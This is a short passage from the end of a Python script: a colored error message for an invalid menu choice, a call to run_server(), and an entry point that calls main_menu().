            print(Fore.RED + "[ERROR] Invalid selection. Please enter 1, 2, 3, or 4." + Style.RESET_ALL)

    run_server()


if __name__ == '__main__':
    main_menu()
